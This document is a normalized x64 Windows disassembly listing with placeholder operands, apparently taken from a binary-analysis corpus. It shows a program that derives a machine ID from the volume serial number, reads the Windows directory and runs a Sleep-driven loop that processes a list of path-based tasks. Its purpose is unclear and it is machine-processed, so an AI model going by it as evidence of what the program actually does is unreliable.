cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_40c960
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov esi edx
mov rcx rbx
mov edx esi
call sub_405e10
mov rax [ rbx + 0x8 ]
mov rcx rax
mov dl 0x1
mov rdi [ rax ]
call [ rdi - 0x20 ]
lea rcx [ rbx + 0x18 ]
call sub_407780
lea rcx [ rbx + 0x20 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
lea rcx [ rbx + 0x10 ]
call sub_407780
test sil sil
jle r-xdata
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
mov rcx rbx
call sub_405d90
sub_40c9e0
push rbp
sub rsp 0x30
mov rbp rsp
mov [ rbp + 0x20 ] rcx
mov [ rbp + 0x28 ] 0x0
nop
mov rcx [ rbp + 0x20 ]
lea rdx [ rbp + 0x28 ]
call sub_40caa0
mov rax [ rbp + 0x20 ]
lea rcx [ rax + 0x18 ]
mov rdx [ rbp + 0x28 ]
call sub_407ca0
mov rax [ rbp + 0x20 ]
mov rcx [ rax + 0x18 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
nop
lea rcx [ rbp + 0x28 ]
call sub_407780
lea rsp [ rbp + 0x30 ]
pop rbp
retn
mov rax [ rbp + 0x20 ]
mov rcx rax
mov rdx [ rax + 0x10 ]
call sub_40cf90
mov rax [ rbp + 0x20 ]
mov ecx [ rax + 0x30 ]
call Sleep
jmp r-xdata
sub_40caa0
push rbp
sub rsp 0xa0
mov rbp rsp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x48 ] rdx
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x80 ] 0x0
nop
mov rcx [ rbp + 0x48 ]
lea rdx [ r-xdata ]
call sub_407ca0
mov rcx [ rbp + 0x50 ]
lea rdx [ rbp + 0x78 ]
call sub_40ccf0
lea rcx [ rbp + 0x80 ]
mov rdx [ rbp + 0x78 ]
call sub_408950
lea rcx [ rbp + 0x70 ]
mov rdx [ rbp + 0x80 ]
mov r8d 0x1
mov r9d 0x3
call sub_408c40
mov rcx [ rbp + 0x70 ]
call sub_408900
mov rcx rax
xor rdx rdx
xor r8 r8
lea r9 [ rbp + 0x9c ]
lea rax [ rbp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea rax [ rbp + 0x94 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x38 ] 0x0
call GetVolumeInformationW
mov rcx [ rbp + 0x50 ]
lea rdx [ rbp + 0x60 ]
mov r8d [ rbp + 0x9c ]
shr r8d 0x10
movzx r8d r8w
mov r9d 0x10
call sub_40cd40
mov rcx [ rbp + 0x50 ]
lea rdx [ rbp + 0x58 ]
movzx r8d [ rbp + 0x9c ]
mov r9d 0x10
call sub_40cd40
lea rcx [ rbp + 0x68 ]
mov edx 0x3
mov r8 [ rbp + 0x60 ]
lea r9 [ r-xdata ]
mov rax [ rbp + 0x58 ]
mov [ rsp + 0x20 ] rax
call sub_4083b0
lea rcx [ rbp + 0x88 ]
mov rdx [ rbp + 0x68 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x88 ]
xor r8 r8
call sub_408720
nop
lea rcx [ rbp + 0x58 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x70 ]
call sub_407730
lea rcx [ rbp + 0x78 ]
call sub_407780
lea rcx [ rbp + 0x80 ]
mov edx 0x2
call sub_407810
mov rax [ rbp + 0x48 ]
lea rsp [ rbp + 0xa0 ]
pop rbp
retn
sub_40cc50
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x70 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x80 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40ccf0
push rbp
push rbx
sub rsp 0x238
mov rbp rsp
mov rbx rdx
lea rcx [ rbp + 0x26 ]
mov edx 0x104
call GetWindowsDirectoryW
mov rcx rbx
lea rdx [ rbp + 0x26 ]
mov r8d 0x105
xor r9 r9
call sub_407fd0
mov rax rbx
lea rsp [ rbp + 0x238 ]
pop rbx
pop rbp
retn
sub_40cd40
push rbp
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x28 ] rdx
mov [ rbp + 0x34 ] r8d
mov [ rbp + 0x30 ] r9d
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x48 ] 0x0
nop
lea rcx [ rbp + 0x48 ]
call sub_407780
lea rcx [ rbp + 0x38 ]
lea r8 [ rw-data ]
mov eax [ rbp + 0x34 ]
cdq
mov r9d [ rbp + 0x30 ]
idiv r9d
movsxd rdx edx
movzx rdx [ r8 + rdx ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x38 ]
mov r8 [ rbp + 0x48 ]
call sub_408120
mov eax [ rbp + 0x34 ]
cdq
mov ecx [ rbp + 0x30 ]
idiv ecx
mov [ rbp + 0x34 ] eax
mov eax [ rbp + 0x34 ]
test eax eax
jne r-xdata
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x48 ]
call sub_407ca0
nop
lea rcx [ rbp + 0x38 ]
call sub_407780
lea rcx [ rbp + 0x48 ]
call sub_407780
mov rax [ rbp + 0x28 ]
lea rsp [ rbp + 0x50 ]
pop rbp
retn
sub_40cdf0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40ce30
push rbp
push rbx
sub rsp 0x58
mov rbp rsp
mov [ rbp + 0x28 ] rdx
mov [ rbp + 0x30 ] 0x0
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x80 ] r8
mov rcx [ rbp + 0x80 ]
call sub_4078e0
nop
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x80 ]
call sub_407d20
jmp r-xdata
lea rcx [ rbp + 0x30 ]
mov rdx [ rbp + 0x48 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x30 ]
mov r8d 0x1
call sub_408db0
test eax eax
jne r-xdata
lea rcx [ rbp + 0x48 ]
call sub_407e70
mov rbx rax
lea rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x48 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x38 ]
mov r8d 0x1
call sub_408db0
movsxd rax eax
mov [ rbx + rax - 0x1 ] 0x5c
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x48 ]
call sub_407ca0
nop
lea rcx [ rbp + 0x30 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x48 ]
call sub_407780
lea rcx [ rbp + 0x80 ]
call sub_407780
mov rax [ rbp + 0x28 ]
lea rsp [ rbp + 0x58 ]
pop rbx
pop rbp
retn
sub_40cf20
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x30 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x80 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40cf90
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x2a0
mov rbp rsp
mov [ rbp + 0x48 ] rcx
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x98 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x90 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0xb0 ] 0x0
mov [ rbp + 0xa8 ] 0x0
mov [ rbp + 0xa0 ] 0x0
mov [ rbp + 0xd8 ] 0x0
mov [ rbp + 0xc0 ] 0x0
mov [ rbp + 0xb8 ] 0x0
mov [ rbp + 0xd0 ] 0x0
mov [ rbp + 0xc8 ] 0x0
mov [ rbp + 0xf0 ] 0x0
mov [ rbp + 0xe8 ] 0x0
mov [ rbp + 0xe0 ] 0x0
mov [ rbp + 0x118 ] 0x0
mov [ rbp + 0x100 ] 0x0
mov [ rbp + 0xf8 ] 0x0
mov [ rbp + 0x110 ] 0x0
mov [ rbp + 0x108 ] 0x0
mov [ rbp + 0x138 ] 0x0
mov [ rbp + 0x120 ] 0x0
mov [ rbp + 0x130 ] 0x0
mov [ rbp + 0x128 ] 0x0
mov [ rbp + 0x160 ] 0x0
mov [ rbp + 0x148 ] 0x0
mov [ rbp + 0x140 ] 0x0
mov [ rbp + 0x158 ] 0x0
mov [ rbp + 0x150 ] 0x0
mov [ rbp + 0x180 ] 0x0
mov [ rbp + 0x168 ] 0x0
mov [ rbp + 0x178 ] 0x0
mov [ rbp + 0x170 ] 0x0
mov [ rbp + 0x1a8 ] 0x0
mov [ rbp + 0x190 ] 0x0
mov [ rbp + 0x188 ] 0x0
mov [ rbp + 0x1a0 ] 0x0
mov [ rbp + 0x198 ] 0x0
mov [ rbp + 0x1b0 ] 0x0
mov [ rbp + 0x1b8 ] 0x0
mov [ rbp + 0x1e0 ] 0x0
mov [ rbp + 0x1c8 ] 0x0
mov [ rbp + 0x1c0 ] 0x0
mov [ rbp + 0x1d8 ] 0x0
mov [ rbp + 0x1d0 ] 0x0
mov [ rbp + 0x1f0 ] 0x0
mov [ rbp + 0x1e8 ] 0x0
mov [ rbp + 0x218 ] 0x0
mov [ rbp + 0x200 ] 0x0
mov [ rbp + 0x1f8 ] 0x0
mov [ rbp + 0x210 ] 0x0
mov [ rbp + 0x208 ] 0x0
mov [ rbp + 0x230 ] 0x0
mov [ rbp + 0x228 ] 0x0
mov [ rbp + 0x220 ] 0x0
mov [ rbp + 0x258 ] 0x0
mov [ rbp + 0x240 ] 0x0
mov [ rbp + 0x238 ] 0x0
mov [ rbp + 0x250 ] 0x0
mov [ rbp + 0x248 ] 0x0
mov [ rbp + 0x278 ] 0x0
mov [ rbp + 0x268 ] 0x0
mov [ rbp + 0x260 ] 0x0
mov [ rbp + 0x270 ] 0x0
mov [ rbp + 0x280 ] 0x0
mov [ rbp + 0x288 ] 0x0
mov [ rbp + 0x298 ] 0x0
mov [ rbp + 0x2d8 ] rdx
mov rcx [ rbp + 0x2d8 ]
call sub_4078e0
nop
xor rax rax
mov [ rbp + 0x57 ] al
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x2d8 ]
call sub_40e580
test al al
je r-xdata
lea rcx [ rbp + 0x58 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x68 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0x78 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x88 ]
mov edx 0x6
call sub_407840
lea rcx [ rbp + 0xb8 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0xc8 ]
mov edx 0x6
call sub_407840
lea rcx [ rbp + 0xf8 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x108 ]
mov edx 0x7
call sub_407840
lea rcx [ rbp + 0x140 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x150 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x168 ]
mov rdx [ r-xdata ]
call sub_409890
lea rcx [ rbp + 0x170 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x188 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x198 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x1b0 ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rcx [ rbp + 0x1c0 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x1d0 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x1e8 ]
mov edx 0x4
call sub_407810
lea rcx [ rbp + 0x208 ]
mov edx 0x6
call sub_407840
lea rcx [ rbp + 0x238 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x248 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x260 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x270 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0x280 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x298 ]
call sub_407780
lea rcx [ rbp + 0x2d8 ]
call sub_407780
movzx rax [ rbp + 0x57 ]
lea rsp [ rbp + 0x2a0 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x28 ]
call sub_4094d0
xor rbx rbx
mov edi eax
sub edi 0x1
cmp ebx edi
jg r-xdata
nop
nop
add edi 0x1
add ebx 0x1
cmp ebx edi
jne r-xdata
mov rcx [ rbp + 0x48 ]
mov edx ebx
call sub_40fbc0
test al al
je r-xdata
lea rcx [ rbp + 0x288 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x288 ]
call sub_40f900
test al al
je r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x20 ]
call sub_4094d0
xor rsi rsi
mov r13d eax
sub r13d 0x1
cmp esi r13d
jg r-xdata
nop
add r13d 0x1
lea rcx [ rbp + 0x280 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x280 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
jmp r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rcx [ rax + rcx * 8 + 0x8 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
jne r-xdata
add esi 0x1
cmp esi r13d
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x270 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x278 ]
mov r8 [ rbp + 0x270 ]
call sub_4118d0
lea rcx [ rbp + 0x268 ]
mov rdx [ rbp + 0x278 ]
call sub_408950
lea rcx [ rbp + 0x260 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x268 ]
mov r9 [ rbp + 0x260 ]
call sub_4115d0
test al al
jne r-xdata
mov [ rbp + 0x294 ] 0x0
xor rax rax
mov [ rbp + 0x57 ] al
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rcx [ rax + rcx * 8 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
lea rcx [ rbp + 0x1f0 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rdx esi
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ rbp + 0x1e8 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x1f0 ]
mov r9 [ rbp + 0x1e8 ]
call sub_40ece0
test al al
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x248 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x250 ]
mov r8 [ rbp + 0x248 ]
call sub_4118d0
lea rcx [ rbp + 0x258 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x250 ]
call sub_408120
lea rcx [ rbp + 0x240 ]
mov rdx [ rbp + 0x258 ]
call sub_408950
lea rcx [ rbp + 0x238 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x240 ]
mov r9 [ rbp + 0x238 ]
call sub_4115d0
test al al
jne r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x1b8 ]
call sub_412650
cmp [ rbp + 0x1b8 ] 0x0
je r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412690
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x1d0 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x1d8 ]
mov r8 [ rbp + 0x1d0 ]
call sub_4118d0
lea rcx [ rbp + 0x1e0 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x1d8 ]
call sub_408120
lea rcx [ rbp + 0x1c8 ]
mov rdx [ rbp + 0x1e0 ]
call sub_408950
lea rcx [ rbp + 0x1c0 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x1c8 ]
mov r9 [ rbp + 0x1c0 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x220 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x228 ]
mov r8 [ rbp + 0x220 ]
call sub_4118d0
lea rcx [ rbp + 0x230 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rdx esi
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x8 ]
mov r8 [ rbp + 0x228 ]
call sub_408120
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x230 ]
xor r8 r8
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r9 esi
add r9 r9
lea r9 [ r9 + r9 * 2 ]
mov r9d [ rax + r9 * 8 + 0x2c ]
call sub_411a20
test al al
je r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412680
test eax eax
je r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x208 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x210 ]
mov r8 [ rbp + 0x208 ]
call sub_4118d0
lea rcx [ rbp + 0x218 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x210 ]
call sub_408120
lea rcx [ rbp + 0x200 ]
mov rdx [ rbp + 0x218 ]
call sub_408950
lea rcx [ rbp + 0x1f8 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x200 ]
mov r9 [ rbp + 0x1f8 ]
call sub_412060
jmp r-xdata
mov rax [ rbp + 0x48 ]
cmp [ rax + 0x40 ] 0x0
je r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov eax [ rax + rcx * 8 + 0x10 ]
sub eax 0x1
test eax eax
je r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
cmp [ rax + rcx * 8 + 0x28 ] 0x0
je r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x1b0 ]
call sub_412650
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412680
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x1b0 ]
mov r8d eax
call sub_411c20
test al al
je r-xdata
sub eax 0x1
test eax eax
jne r-xdata
mov rcx [ rbp + 0x48 ]
mov edx 0x1
call sub_40f5a0
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x198 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x1a0 ]
mov r8 [ rbp + 0x198 ]
call sub_4118d0
lea rcx [ rbp + 0x1a8 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x1a0 ]
call sub_408120
lea rcx [ rbp + 0x190 ]
mov rdx [ rbp + 0x1a8 ]
call sub_408950
lea rcx [ rbp + 0x188 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x190 ]
mov r9 [ rbp + 0x188 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
mov al 0x1
mov [ rbp + 0x57 ] al
jmp r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
cmp [ rax + rcx * 8 + 0x14 ] 0x0
je r-xdata
jmp r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412690
jmp r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rcx [ rax + rcx * 8 + 0x18 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x128 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x130 ]
mov r8 [ rbp + 0x128 ]
call sub_4118d0
lea rcx [ rbp + 0x138 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rdx esi
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x8 ]
mov r8 [ rbp + 0x130 ]
call sub_408120
lea rcx [ rbp + 0x120 ]
mov edx 0x3
lea r8 [ r-xdata ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r9 esi
add r9 r9
lea r9 [ r9 + r9 * 2 ]
mov r9 [ rax + r9 * 8 + 0x20 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_4083b0
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x138 ]
mov r8 [ rbp + 0x120 ]
lea r9 [ rbp + 0x294 ]
call sub_411dc0
test al al
je r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x170 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x178 ]
mov r8 [ rbp + 0x170 ]
call sub_4118d0
lea rcx [ rbp + 0x180 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rdx esi
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x8 ]
mov r8 [ rbp + 0x178 ]
call sub_408120
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x168 ]
call sub_412650
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412680
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x180 ]
mov r8 [ rbp + 0x168 ]
mov r9d eax
call sub_411ca0
test al al
jne r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
cmp [ rax + rcx * 8 + 0x29 ] 0x0
je r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xe0 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xe8 ]
mov r8 [ rbp + 0xe0 ]
call sub_4118d0
lea rcx [ rbp + 0xf0 ]
mov edx 0x6
lea r8 [ r-xdata ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r9 esi
add r9 r9
lea r9 [ r9 + r9 * 2 ]
mov r9 [ rax + r9 * 8 + 0x8 ]
mov rax [ rbp + 0xe8 ]
mov [ rsp + 0x20 ] rax
lea rax [ r-xdata ]
mov [ rsp + 0x28 ] rax
lea rax [ r-xdata ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r10 esi
add r10 r10
lea r10 [ r10 + r10 * 2 ]
mov rax [ rax + r10 * 8 + 0x20 ]
mov [ rsp + 0x38 ] rax
call sub_4083b0
mov rax [ rbp + 0x48 ]
mov rcx rax
mov rax [ rax + 0x20 ]
movsxd rdx esi
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x18 ]
mov r8 [ rbp + 0xf0 ]
lea r9 [ rbp + 0x294 ]
call sub_411dc0
test al al
je r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x108 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x110 ]
mov r8 [ rbp + 0x108 ]
call sub_4118d0
lea rcx [ rbp + 0x118 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x110 ]
call sub_408120
lea rcx [ rbp + 0x100 ]
mov rdx [ rbp + 0x118 ]
call sub_408950
lea rcx [ rbp + 0xf8 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x100 ]
mov r9 [ rbp + 0xf8 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
mov al 0x1
mov [ rbp + 0x57 ] al
jmp r-xdata
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
cmp [ rax + rcx * 8 + 0x14 ] 0x0
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x150 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x158 ]
mov r8 [ rbp + 0x150 ]
call sub_4118d0
